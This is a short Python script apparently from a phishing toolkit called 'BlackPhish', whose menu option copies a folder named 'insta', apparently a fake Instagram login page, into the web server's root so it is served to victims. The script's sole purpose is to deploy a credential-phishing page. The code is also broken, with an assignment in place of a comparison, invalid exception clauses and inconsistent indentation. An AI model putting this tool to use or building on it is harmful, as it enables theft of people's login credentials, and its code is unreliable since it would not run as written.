try:
	import os

except ImportError():
	print("Error importing")
	exit(1)


def install(): # Host webpage #
	os.system('cp /usr/share/Blackphish/insta /var/www/html/')



def main():  # Main script #
    choice = input("[BlackPhish] -> ") # Get user input #
    if choice in "1":
    	install()
		os.system('clear')



try: # This will start the script
	if __name__ = '__main__':
		main()

except KeyboardInterrupt(): # Will detect if they exit #
	print("Exiting")
	exit(0)

